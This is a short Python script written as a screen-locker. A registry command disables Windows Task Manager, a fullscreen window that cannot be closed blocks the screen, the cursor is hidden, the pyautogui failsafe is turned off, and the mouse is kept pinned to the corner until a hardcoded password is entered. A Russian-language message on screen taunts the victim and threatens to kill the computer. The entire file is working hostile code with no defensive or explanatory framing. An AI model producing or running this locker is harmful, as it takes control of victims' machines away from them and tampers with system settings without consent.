from tkinter import Tk, Entry, Label
import pyautogui, sys
import os
import random
os.system('REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1')

root = Tk()
a = random.random()
label = Label(root, text="North", font='Courier 8')
label.place(relx=.5, rely=.94, anchor="center")

label = Label(root, text="Приветик, семпай! Пока ты тут будешь подбирать парольчик, я убью твой компьютер ❤", font='Courier 16')
label.place(relx=.5, rely=.4, anchor="center")
 
entry = Entry(root, font='Courier 14')
entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)
entry.focus()
 
root.protocol('WM_DELETE_WINDOW', lambda: None)
root.attributes('-fullscreen', True)
root.config(cursor="none")
pyautogui.FAILSAFE = False
 
while True:
    pyautogui.moveTo(0, 0)
    root.update()
    if entry.get() =="яхзкакойпароль":
        sys.exit()